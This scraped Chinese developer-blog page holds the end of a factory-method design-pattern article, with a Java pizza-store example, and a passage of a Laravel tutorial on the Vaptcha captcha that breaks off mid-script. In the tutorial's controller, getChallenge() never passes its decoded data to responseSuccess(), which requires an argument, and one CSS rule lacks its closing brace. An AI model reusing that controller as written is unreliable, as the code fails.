<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&#x590D;&#x5236;&#x4EE3;&#x7801;public class PizzaTestDrive {</span><br><span class="line"> </span><br><span class="line">    public static void main(String[] args) {</span><br><span class="line">        PizzaStore nyStore = new NYPizzaStore();</span><br><span class="line">        PizzaStore chicagoStore = new ChicagoPizzaStore();</span><br><span class="line"> </span><br><span class="line">        Pizza pizza = nyStore.orderPizza(&quot;cheese&quot;);</span><br><span class="line">        System.out.println(&quot;Ethan ordered a &quot; + pizza + &quot;\n&quot;);</span><br><span class="line"> </span><br><span class="line">        pizza = chicagoStore.orderPizza(&quot;cheese&quot;);</span><br><span class="line">        System.out.println(&quot;Joel ordered a &quot; + pizza + &quot;\n&quot;);</span><br><span class="line">        pizza = nyStore.orderPizza(&quot;clam&quot;);</span><br><span class="line">        System.out.println(&quot;Ethan ordered a &quot; + pizza + &quot;\n&quot;);</span><br><span class="line"> </span><br><span class="line">        pizza = chicagoStore.orderPizza(&quot;clam&quot;);</span><br><span class="line">        System.out.println(&quot;Joel ordered a &quot; + pizza + &quot;\n&quot;);</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></table></figure>

<h2 id="&#x4E09;&#x8005;&#x7684;&#x5177;&#x4F53;&#x533A;&#x522B;"><a href="#&#x4E09;&#x8005;&#x7684;&#x5177;&#x4F53;&#x533A;&#x522B;" class="headerlink" title="&#x4E09;&#x8005;&#x7684;&#x5177;&#x4F53;&#x533A;&#x522B;"></a>&#x4E09;&#x8005;&#x7684;&#x5177;&#x4F53;&#x533A;&#x522B;</h2><h3 id="&#x5DE5;&#x5382;&#x65B9;&#x6CD5;&#x6A21;&#x5F0F;&#x548C;&#x7B80;&#x5355;&#x5DE5;&#x5382;&#x6A21;&#x5F0F;&#x6BD4;&#x8F83;&#xFF1A;"><a href="#&#x5DE5;&#x5382;&#x65B9;&#x6CD5;&#x6A21;&#x5F0F;&#x548C;&#x7B80;&#x5355;&#x5DE5;&#x5382;&#x6A21;&#x5F0F;&#x6BD4;&#x8F83;&#xFF1A;" class="headerlink" title="&#x5DE5;&#x5382;&#x65B9;&#x6CD5;&#x6A21;&#x5F0F;&#x548C;&#x7B80;&#x5355;&#x5DE5;&#x5382;&#x6A21;&#x5F0F;&#x6BD4;&#x8F83;&#xFF1A;"></a>&#x5DE5;&#x5382;&#x65B9;&#x6CD5;&#x6A21;&#x5F0F;&#x548C;&#x7B80;&#x5355;&#x5DE5;&#x5382;&#x6A21;&#x5F0F;&#x6BD4;&#x8F83;&#xFF1A;</h3><p>&#x5DE5;&#x5382;&#x65B9;&#x6CD5;&#x6A21;&#x5F0F;&#x8DDF;&#x7B80;&#x5355;&#x5DE5;&#x5382;&#x6A21;&#x5F0F;&#x5728;&#x7ED3;&#x6784;&#x4E0A;&#x7684;&#x4E0D;&#x540C;&#x662F;&#x5F88;&#x660E;&#x663E;&#x7684;&#xFF0C;&#x5DE5;&#x5382;&#x65B9;&#x6CD5;&#x6A21;&#x5F0F;&#x7684;&#x6838;&#x5FC3;&#x662F;&#x4E00;&#x4E2A;&#x62BD;&#x8C61;&#x5DE5;&#x5382;&#x7C7B;&#xFF0C;&#x800C;&#x7B80;&#x5355;&#x5DE5;&#x5382;&#x6A21;&#x5F0F;&#x7684;&#x6838;&#x5FC3;&#x5728;&#x4E00;&#x4E2A;&#x5177;&#x4F53;&#x7C7B;&#x3002;&#x663E;&#x800C;&#x6613;&#x89C1;&#x5DE5;&#x5382;&#x65B9;&#x6CD5;&#x6A21;&#x5F0F;&#x8FD9;&#x79CD;&#x7ED3;&#x6784;&#x66F4;&#x597D;&#x6269;&#x5C55;&#xFF0C;&#x6743;&#x529B;&#x4E0B;&#x53D1;&#xFF0C;&#x5206;&#x5E03;&#x5F0F;&#x6BD4;&#x96C6;&#x4E2D;&#x5F0F;&#x66F4;&#x5177;&#x4F18;&#x52BF;&#x3002;</p>
<p>&#x5982;&#x679C;&#x7CFB;&#x7EDF;&#x9700;&#x8981;&#x52A0;&#x5165;&#x4E00;&#x4E2A;&#x65B0;&#x7684;&#x4EA7;&#x54C1;&#xFF0C;&#x90A3;&#x4E48;&#x6240;&#x9700;&#x8981;&#x7684;&#x5C31;&#x662F;&#x5411;&#x7CFB;&#x7EDF;&#x4E2D;&#x52A0;&#x5165;&#x4E00;&#x4E2A;&#x8FD9;&#x4E2A;&#x4EA7;&#x54C1;&#x7C7B;&#x4EE5;&#x53CA;&#x5B83;&#x6240;&#x5BF9;&#x5E94;&#x7684;&#x5DE5;&#x5382;&#x7C7B;&#x3002;&#x6CA1;&#x6709;&#x5FC5;&#x8981;&#x4FEE;&#x6539;&#x5BA2;&#x6237;&#x7AEF;&#xFF0C;&#x4E5F;&#x6CA1;&#x6709;&#x5FC5;&#x8981;&#x4FEE;&#x6539;&#x62BD;&#x8C61;&#x5DE5;&#x5382;&#x89D2;&#x8272;&#x6216;&#x8005;&#x5176;&#x4ED6;&#x5DF2;&#x6709;&#x7684;&#x5177;&#x4F53;&#x5DE5;&#x5382;&#x89D2;&#x8272;&#x3002;&#x5BF9;&#x4E8E;&#x589E;&#x52A0;&#x65B0;&#x7684;&#x4EA7;&#x54C1;&#x7C7B;&#x800C;&#x8A00;&#xFF0C;&#x8FD9;&#x4E2A;&#x7CFB;&#x7EDF;&#x5B8C;&#x5168;&#x652F;&#x6301;&#x5F00;&#x95ED;&#x539F;&#x5219;</p>
<h3 id="&#x5DE5;&#x5382;&#x65B9;&#x6CD5;&#x6A21;&#x5F0F;&#x548C;&#x4E0B;&#x62BD;&#x8C61;&#x5DE5;&#x5382;&#x6A21;&#x5F0F;&#x5BF9;&#x6BD4;"><a href="#&#x5DE5;&#x5382;&#x65B9;&#x6CD5;&#x6A21;&#x5F0F;&#x548C;&#x4E0B;&#x62BD;&#x8C61;&#x5DE5;&#x5382;&#x6A21;&#x5F0F;&#x5BF9;&#x6BD4;" class="headerlink" title="&#x5DE5;&#x5382;&#x65B9;&#x6CD5;&#x6A21;&#x5F0F;&#x548C;&#x4E0B;&#x62BD;&#x8C61;&#x5DE5;&#x5382;&#x6A21;&#x5F0F;&#x5BF9;&#x6BD4;"></a>&#x5DE5;&#x5382;&#x65B9;&#x6CD5;&#x6A21;&#x5F0F;&#x548C;&#x4E0B;&#x62BD;&#x8C61;&#x5DE5;&#x5382;&#x6A21;&#x5F0F;&#x5BF9;&#x6BD4;</h3><ul>
<li>&#x5DE5;&#x5382;&#x65B9;&#x6CD5;&#x6A21;&#x5F0F;&#x662F;&#x4E00;&#x79CD;&#x6781;&#x7AEF;&#x60C5;&#x51B5;&#x7684;&#x62BD;&#x8C61;&#x5DE5;&#x5382;&#x6A21;&#x5F0F;&#xFF0C;&#x800C;&#x62BD;&#x8C61;&#x5DE5;&#x5382;&#x6A21;&#x5F0F;&#x53EF;&#x4EE5;&#x770B;&#x6210;&#x662F;&#x5DE5;&#x5382;&#x65B9;&#x6CD5;&#x6A21;&#x5F0F;&#x7684;&#x63A8;&#x5E7F;&#x3002;</li>
<li>&#x5DE5;&#x5382;&#x65B9;&#x6CD5;&#x6A21;&#x5F0F;&#x7528;&#x6765;&#x521B;&#x5EFA;&#x4E00;&#x4E2A;&#x4EA7;&#x54C1;&#x7684;&#x7B49;&#x7EA7;&#x7ED3;&#x6784;&#xFF0C;&#x800C;&#x62BD;&#x8C61;&#x5DE5;&#x5382;&#x6A21;&#x5F0F;&#x662F;&#x7528;&#x6765;&#x521B;&#x5EFA;&#x591A;&#x4E2A;&#x4EA7;&#x54C1;&#x7684;&#x7B49;&#x7EA7;&#x7ED3;&#x6784;&#x3002;</li>
<li>&#x5DE5;&#x5382;&#x65B9;&#x6CD5;&#x6A21;&#x5F0F;&#x53EA;&#x6709;&#x4E00;&#x4E2A;&#x62BD;&#x8C61;&#x4EA7;&#x54C1;&#x7C7B;&#xFF0C;&#x800C;&#x62BD;&#x8C61;&#x5DE5;&#x5382;&#x6A21;&#x5F0F;&#x6709;&#x591A;&#x4E2A;&#x62BD;&#x8C61;&#x4EA7;&#x54C1;&#x7C7B;&#x3002;</li>
<li>&#x5DE5;&#x5382;&#x65B9;&#x6CD5;&#x6A21;&#x5F0F;&#x4E2D;&#x5177;&#x4F53;&#x5DE5;&#x5382;&#x7C7B;&#x53EA;&#x6709;&#x4E00;&#x4E2A;&#x521B;&#x5EFA;&#x65B9;&#x6CD5;&#xFF0C;&#x800C;&#x62BD;&#x8C61;&#x5DE5;&#x5382;&#x6A21;&#x5F0F;&#x4E2D;&#x5177;&#x4F53;&#x5DE5;&#x5382;&#x7C7B;&#x6709;&#x591A;&#x4E2A;&#x521B;&#x5EFA;&#x65B9;&#x6CD5;&#x3002;</li>
</ul>
<h2 id="Github&#x6E90;&#x7801;"><a href="#Github&#x6E90;&#x7801;" class="headerlink" title="Github&#x6E90;&#x7801;"></a>Github&#x6E90;&#x7801;</h2><blockquote>
<p>nezha&#x7684;GitHub&#x5730;&#x5740;&#xFF1A;(nezha/DesignPatterns)[<a href="/external_links/6e98918132366cb4b41587d4e6b44467.html" target="blank" rel="noopener">github.com/nezha/Desig&#x2026;</a>]</p>
</blockquote>
<h2 id="&#x53C2;&#x8003;&#x6587;&#x732E;"><a href="#&#x53C2;&#x8003;&#x6587;&#x732E;" class="headerlink" title="&#x53C2;&#x8003;&#x6587;&#x732E;"></a>&#x53C2;&#x8003;&#x6587;&#x732E;</h2><p><a href="/external_links/1af0a51864eee839bc2d735164c36e94.html" target="blank" rel="noopener">&#x8BBE;&#x8BA1;&#x6A21;&#x5F0F;&#x5E72;&#x8D27;&#x7CFB;&#x5217;&#xFF1A;&#xFF08;&#x4E00;&#xFF09;&#x7B80;&#x5355;&#x5DE5;&#x5382;&#x6A21;&#x5F0F;</a></p>
<p><a href="/external_links/83ecec937659fee126a893c0ebef4c80.html" target="blank" rel="noopener">&#x8BBE;&#x8BA1;&#x6A21;&#x5F0F;&#x5E72;&#x8D27;&#x7CFB;&#x5217;&#xFF1A;&#xFF08;&#x4E8C;&#xFF09;&#x5DE5;&#x5382;&#x65B9;&#x6CD5;&#x6A21;&#x5F0F;&#x3010;&#x5B66;&#x4E60;&#x96BE;&#x5EA6;&#xFF1A;&#x2605;&#x2605;&#x2606;&#x2606;&#x2606;&#xFF0C;&#x4F7F;&#x7528;&#x9891;&#x7387;&#xFF1A;&#x2605;&#x2605;&#x2605;&#x2605;&#x2605;&#x3011;</a></p>
<p><a href="/external_links/9619c0b151564ce448753eaf9c5a4238.html" target="blank" rel="noopener">&#x8BBE;&#x8BA1;&#x6A21;&#x5F0F;&#x5E72;&#x8D27;&#x7CFB;&#x5217;&#xFF1A;&#xFF08;&#x4E09;&#xFF09;&#x62BD;&#x8C61;&#x5DE5;&#x5382;&#x6A21;&#x5F0F;&#x3010;&#x5B66;&#x4E60;&#x96BE;&#x5EA6;&#xFF1A;&#x2605;&#x2605;&#x2605;&#x2605;&#x2606;&#xFF0C;&#x4F7F;&#x7528;&#x9891;&#x7387;&#xFF1A;&#x2605;&#x2605;&#x2605;&#x2605;&#x2605;&#x3011;</a></p>
<p><strong>&#x672C;&#x6587;&#x8F6C;&#x8F7D;&#x81EA;:</strong> <a href="/external_links/6954d513b2b2bab1368739202823593e.html" target="blank" rel="noopener">&#x6398;&#x91D1;</a></p>
<p><em><a href="https://dev.newban.cn/">&#x5F00;&#x53D1;&#x8005;&#x535A;&#x5BA2; &#x2013; &#x548C;&#x5F00;&#x53D1;&#x76F8;&#x5173;&#x7684; &#x8FD9;&#x91CC;&#x5168;&#x90FD;&#x6709;</a></em></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://dev.newban.cn../../6844903520097796109.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="开发者博客">
      <meta itemprop="description" content>
      <meta itemprop="image" content="../../images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="开发者博客 – IT技术 尽在开发者博客">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="../../6844903520097796109.html" itemprop="url">Laravel 中使用 vaptcha 手势验证码</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-12-08T13:39:25+08:00">
                2017-12-08
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <blockquote>
<p>Vaptcha&#x662F;&#x6700;&#x8FD1;&#x624D;&#x51FA;&#x73B0;&#x7684;&#x4E00;&#x79CD;&#x65B0;&#x578B;&#x7684;&#x624B;&#x52BF;&#x9A8C;&#x8BC1;&#x7801;&#xFF0C;&#x86EE;&#x6709;&#x8DA3;&#x7684;&#xFF0C;&#x8BB0;&#x5F55;&#x4E00;&#x4E0B;&#x4F7F;&#x7528;&#x65B9;&#x6CD5;&#x3002;<br> &#x5B98;&#x7F51;&#x5730;&#x5740;<a href="/external_links/df545f944ab7507e09e263119420df4d.html" target="blank" rel="noopener">www.vaptcha.com/</a></p>
</blockquote>
<p> &#x51C6;&#x5907;&#x5DE5;&#x4F5C;&#xFF0C;&#x83B7;&#x53D6;vid&#x4E0E;key </p>
<p>&#x6839;&#x636E;&#x6587;&#x6863;&#x8BF4;&#x660E;&#xFF0C;&#x4F7F;&#x7528;&#x9700;&#x8981;&#x5728;&#x540E;&#x53F0;&#x521B;&#x5EFA;&#x4E00;&#x4E2A;&#x9A8C;&#x8BC1;&#x5355;&#x5143;&#xFF0C;&#x5982;&#x4E0B;&#x56FE;&#x6240;&#x793A;&#xFF0C;&#x5176;&#x4E2D;&#x6709;&#x9009;&#x9879;&#x91CC;&#x9762;&#x6709;&#x4E2A;&#x9A8C;&#x8BC1;&#x573A;&#x666F;&#xFF0C;&#x611F;&#x89C9;&#x63CF;&#x8FF0;&#x7684;&#x4E0D;&#x662F;&#x5F88;&#x6E05;&#x695A;&#xFF0C;&#x611F;&#x89C9;&#x5927;&#x6982;&#x7684;&#x610F;&#x601D;&#x5C31;&#x662F;&#x53EF;&#x4EE5;&#x7ED9;&#x67D0;&#x4E2A;&#x573A;&#x666F;&#x505A;&#x7EDF;&#x8BA1;&#xFF0C;&#x6BD4;&#x5982;&#x767B;&#x5F55;&#x573A;&#x666F;&#x3002;<br><img src="https://gitee.com/songjianzaina/juejin_p4/raw/master/img/3196bf457eb8584888e42a0422c8f62df8eea58c11e5f0c67c71546c84f95f7d" alt="file"><br> &#x521B;&#x5EFA;&#x6210;&#x529F;&#x4E4B;&#x540E;&#xFF0C;&#x4F1A;&#x7684;&#x5230;&#x5982;&#x4E0B;&#x56FE;&#x6240;&#x793A;&#x7684;vid&#x4E0E;key&#xFF0C;&#x540E;&#x9762;&#x518D;&#x4F7F;&#x7528;&#x7684;&#x65F6;&#x5019;&#x4F1A;&#x7528;&#x5230;&#x3002;<br> <img src="https://gitee.com/songjianzaina/juejin_p4/raw/master/img/45125b6e8c43f1e4b94cec10f6a4268676d4f1e90614cd7ec49ece6201ee7b1d" alt="file"></p>
<p> &#x540E;&#x7AEF;&#x5F00;&#x53D1;&#x63A5;&#x53E3; </p>
<h2 id="&#x5B89;&#x88C5;"><a href="#&#x5B89;&#x88C5;" class="headerlink" title="&#x5B89;&#x88C5;#"></a>&#x5B89;&#x88C5;<a href="#&#x5B89;&#x88C5;">#</a></h2><p>&#x6309;&#x7167;github&#x7684;&#x6587;&#x6863;&#x6765;&#xFF0C;&#x4F7F;&#x7528;composer&#x5B89;&#x88C5;&#xFF1A;</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x590D;&#x5236;&#x4EE3;&#x7801;composer require Vaptcha/vaptcha-sdk;</span><br></pre></td></tr></table></figure>

<h2 id="&#x521B;&#x5EFA;&#x8DEF;&#x7531;&#x63A7;&#x5236;&#x5668;"><a href="#&#x521B;&#x5EFA;&#x8DEF;&#x7531;&#x63A7;&#x5236;&#x5668;" class="headerlink" title="&#x521B;&#x5EFA;&#x8DEF;&#x7531;&#x63A7;&#x5236;&#x5668;#"></a>&#x521B;&#x5EFA;&#x8DEF;&#x7531;&#x63A7;&#x5236;&#x5668;<a href="#&#x521B;&#x5EFA;&#x8DEF;&#x7531;&#x63A7;&#x5236;&#x5668;">#</a></h2><p>&#x6839;&#x636E;&#x6587;&#x6863;&#x8FD9;&#x91CC;&#x9700;&#x8981;&#x4E24;&#x4E2A;&#x63A5;&#x53E3;&#x4F9B;&#x524D;&#x7AEF;&#x4F7F;&#x7528;&#xFF0C;&#x4E00;&#x4E2A;&#x662F;&#x83B7;&#x53D6;<code>vid</code> &#x548C;<code>challenge</code>&#xFF0C;&#x7528;&#x4E8E;&#x5728;&#x5BA2;&#x6237;&#x7AEF;&#x521D;&#x59CB;&#x5316;&#x5B9E;&#x4F8B;&#xFF0C;&#x7B2C;&#x4E8C;&#x4E2A;&#x662F;&#x5B95;&#x673A;&#x6A21;&#x5F0F;&#xFF0C;&#x867D;&#x7136;&#x4E0D;&#x77E5;&#x5230;&#x65F6;&#x662F;&#x5565;&#xFF0C;&#x53CD;&#x6B63;&#x7167;&#x7740;&#x5199;&#x5C31;&#x884C;&#x4E86;2333&#x3002;<br> sdk&#x4E5F;&#x63D0;&#x4F9B;&#x4E86;&#x5BF9;&#x5E94;&#x7684;&#x4E24;&#x4E2A;&#x63A5;&#x53E3; &#xFF0C;&#x5176;&#x4E2D;<code>getChallenge</code>&#x63A5;&#x53E3;&#xFF0C;&#x6709;&#x4E2A;<code>$sceneId</code>&#x53C2;&#x6570;&#xFF0C;&#x5C31;&#x662F;&#x5BF9;&#x5E94;&#x4E4B;&#x524D;&#x7684;&#x9A8C;&#x8BC1;&#x573A;&#x666F;&#x3002;&#x8DEF;&#x8BBE;&#x8BA1;&#x5982;&#x4E0B;</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x590D;&#x5236;&#x4EE3;&#x7801;Route::get(&apos;vaptcha/challenge&apos;, &apos;VaptchaController@getChallenge&apos;);</span><br><span class="line">Route::get(&apos;vaptcha/downtime&apos;, &apos;VaptchaController@getDownTime&apos;);</span><br></pre></td></tr></table></figure>

<p>&#x521B;&#x5EFA;&#x63A7;&#x5236;&#x5668;&#xFF1A;</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">&#x590D;&#x5236;&#x4EE3;&#x7801;&lt;?php</span><br><span class="line"></span><br><span class="line">namespace App\Http\Controllers;</span><br><span class="line"></span><br><span class="line">use App\Http\Controllers\Controller;</span><br><span class="line">use Illuminate\Http\Request;</span><br><span class="line">use Vaptcha\Vaptcha;</span><br><span class="line"></span><br><span class="line">class VaptchaController extends Controller</span><br><span class="line">{</span><br><span class="line"></span><br><span class="line">    private $vaptcha;</span><br><span class="line"></span><br><span class="line">    public function __construct(){</span><br><span class="line">        $this-&gt;vaptcha = new Vaptcha(&apos;vid&apos;, &apos;key&apos;); // &#x8FD9;&#x91CC;&#x66FF;&#x6362;&#x6210;&#x524D;&#x9762;&#x83B7;&#x53D6;&#x5230;&#x7684;vid&#x4E0E;key</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    public function response($status, $msg, $data){</span><br><span class="line">        return response()-&gt;json([</span><br><span class="line">            &apos;status&apos; =&gt;  $status,</span><br><span class="line">            &apos;msg&apos; =&gt; $msg,</span><br><span class="line">            &apos;data&apos; =&gt; $data</span><br><span class="line">        ], $status);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    public function responseSuccess($data){</span><br><span class="line">        return $this-&gt;response(200, &apos;success&apos;, $data);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    public function getChallenge(Request $request){</span><br><span class="line">        $data = json_decode($this-&gt;vaptcha-&gt;getChallenge($request-&gt;sceneid));</span><br><span class="line">        return $this-&gt;responseSuccess();</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    public function getDownTime(Request $request) {</span><br><span class="line">        $data = json_decode($this-&gt;vaptcha-&gt;downTime($request-&gt;data));</span><br><span class="line">        return response()-&gt;json($data);    </span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></table></figure>

<p>&#x8BBF;&#x95EE;&#x63A5;&#x53E3;&#xFF0C;&#x6210;&#x529F;&#x83B7;&#x53D6;&#x5230;&#x6570;&#x636E;<br><img src="https://gitee.com/songjianzaina/juejin_p4/raw/master/img/c9319bb61d40af88a3f6053b523c567964018b7c51c0763c893560d2e3ed5c3e" alt="file"></p>
<p> &#x524D;&#x7AEF;&#x4F7F;&#x7528;vaptcha </p>
<p>&#x76F4;&#x63A5;&#x590D;&#x5236;&#x6587;&#x6863;&#x4E2D;&#x7684;&#x914D;&#x7F6E;&#xFF0C;&#x6539;&#x4E00;&#x4E0B;ok</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">&#x590D;&#x5236;&#x4EE3;&#x7801;&lt;style&gt;</span><br><span class="line">    #vaptcha_container {</span><br><span class="line">        margin-bottom: 10px;</span><br><span class="line">        display: table;</span><br><span class="line">        background-color: #EEEEEE;</span><br><span class="line">        border-radius: 2px</span><br><span class="line">    .vaptcha-init-loading {</span><br><span class="line">        display: table-cell;</span><br><span class="line">        vertical-align: middle;</span><br><span class="line">        text-align: center</span><br><span class="line">    }</span><br><span class="line">    .vaptcha-init-loading&gt;a {</span><br><span class="line">        display: inline-block;</span><br><span class="line">        width: 18px;</span><br><span class="line">        height: 18px;</span><br><span class="line">    }</span><br><span class="line">    .vaptcha-init-loading&gt;a img {</span><br><span class="line">        vertical-align: middle</span><br><span class="line">    }</span><br><span class="line">    .vaptcha-init-loading .vaptcha-text {</span><br><span class="line">        font-family: sans-serif;</span><br><span class="line">        font-size: 12px;</span><br><span class="line">        color: #CCCCCC;</span><br><span class="line">        vertical-align: middle</span><br><span class="line">    }</span><br><span class="line">&lt;/style&gt;</span><br><span class="line">&lt;!-- &#x70B9;&#x51FB;&#x5F0F;&#x5EFA;&#x8BAE;&#x5BBD;&#x5EA6;&#x4E0D;&#x4F4E;&#x4E8E;200px,&#x9AD8;&#x5EA6;&#x4E0D;&#x4F4E;&#x4E8E;36px --&gt;</span><br><span class="line">&lt;!-- &#x5D4C;&#x5165;&#x5F0F;&#x4EC5;&#x9700;&#x8BBE;&#x7F6E;&#x5BBD;&#x5EA6;&#xFF0C;&#x9AD8;&#x5EA6;&#x6839;&#x636E;&#x5BBD;&#x5EA6;&#x81EA;&#x9002;&#x5E94;&#xFF0C;&#x6700;&#x5C0F;&#x5BBD;&#x5EA6;&#x4E3A;200px --&gt;</span><br><span class="line">&lt;div id=&quot;vaptcha_container&quot; style=&quot;width:300px;height:36px;&quot;&gt;</span><br><span class="line">   &lt;!--vaptcha_container&#x662F;&#x7528;&#x6765;&#x5F15;&#x5165;VAPTCHA&#x7684;&#x5BB9;&#x5668;&#xFF0C;&#x4E0B;&#x9762;&#x4EE3;&#x7801;&#x4E3A;&#x9884;&#x52A0;&#x8F7D;&#x52A8;&#x753B;&#xFF0C;&#x4EC5;&#x4F9B;&#x53C2;&#x8003;--&gt;</span><br><span class="line">   &lt;div class=&quot;vaptcha-init-loading&quot;&gt;</span><br><span class="line">      &lt;a href=&quot;https://www.vaptcha.com/&quot; target=&quot;_blank&quot;&gt;&lt;img src=&quot;https://cdn.vaptcha.com/vaptcha-loading.gif&quot;/&gt;&lt;/a&gt;</span><br><span class="line">      &lt;span class=&quot;vaptcha-text&quot;&gt;VAPTCHA&#x542F;&#x52A8;&#x4E2D;...&lt;/span&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;script src=&quot;https://cdn.vaptcha.com/v.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;!-- &#x5F15;&#x5165;jquery --&gt;</span><br><span class="line">&lt;script src=&quot;/js/jquery.min.js&quot;&gt;&lt;/script&gt; </span><br><span class="line">&lt;script type=&quot;text/javascript&quot;&gt;</span><br><span class="line">//&#x8FD9;&#x91CC;&#x4F7F;&#x7528;&#x5230;&#x9A8C;&#x8BC1;&#x573A;&#x666F;&#xFF0C;&#x4F20;&#x8FC7;&#x53BB;&#x7684;&#x53C2;&#x6570;&#x5373;&#x4E3A;&#x5BF9;&#x5E94;&#x7684;&#x7F16;&#x53F7;&#xFF0C;&#x6BD4;&#x5982;&#x4E4B;&#x524D;&#x767B;&#x5F55;&#x7684;&#x5BF9;&#x5E94;&#x7684;&#x7F16;&#x53F7;&#x5373;&#x4E3A;01</span><br><span class="line">    $.get(&apos;/api/vaptcha/challenge?sceneid=01&apos;, function(response){</span><br><span class="line">        console.log(response);</span><br><span class="line">        var options={</span><br><span class="line">            vid: response.data.vid, //&#x9A8C;&#x8BC1;&#x5355;&#x5143;id, string, &#x5FC5;&#x586B;</span><br><span class="line">            challenge: response.data.challenge, //&#x9A8C;&#x8BC1;&#x6D41;&#x6C34;&#x53F7;, string, &#x5FC5;&#x586B;</span><br><span class="line">            container:&quot;#vaptcha_container&quot;,//&#x9A8C;&#x8BC1;&#x7801;&#x5BB9;&#x5668;, HTMLElement&#x6216;&#x8005;selector, &#x5FC5;&#x586B;</span><br><span class="line">            type:&quot;click&quot;, //&#x5FC5;&#x586B;&#xFF0C;&#x8868;&#x793A;&#x70B9;&#x51FB;&#x5F0F;&#x9A8C;&#x8BC1;&#x6A21;&#x5F0F;,</span><br><span class="line">            effect:&apos;float&apos;, //&#x9A8C;&#x8BC1;&#x56FE;&#x663E;&#x793A;&#x65B9;&#x5F0F;, string, &#x53EF;&#x9009;&#x62E9;float, popup, &#x9ED8;&#x8BA4;float</span><br><span class="line">            https:false, //&#x534F;&#x8BAE;&#x7C7B;&#x578B;, boolean, &#x53EF;&#x9009;true, false</span><br><span class="line">            color:&quot;#57ABFF&quot;, //&#x6309;&#x94AE;&#x989C;&#x8272;, string</span><br><span class="line">            outage:&quot;/api/vaptcha/downtime&quot;, //&#x670D;&#x52A1;&#x5668;&#x7AEF;&#x914D;&#x7F6E;&#x7684;&#x5B95;&#x673A;&#x6A21;&#x5F0F;&#x63A5;&#x53E3;&#x5730;&#x5740;</span><br><span class="line">            success:function(token,challenge){//&#x9A8C;&#x8BC1;&#x6210;&#x529F;&#x56DE;&#x8C03;&#x51FD;&#x6570;, &#x53C2;&#x6570;token, challenge 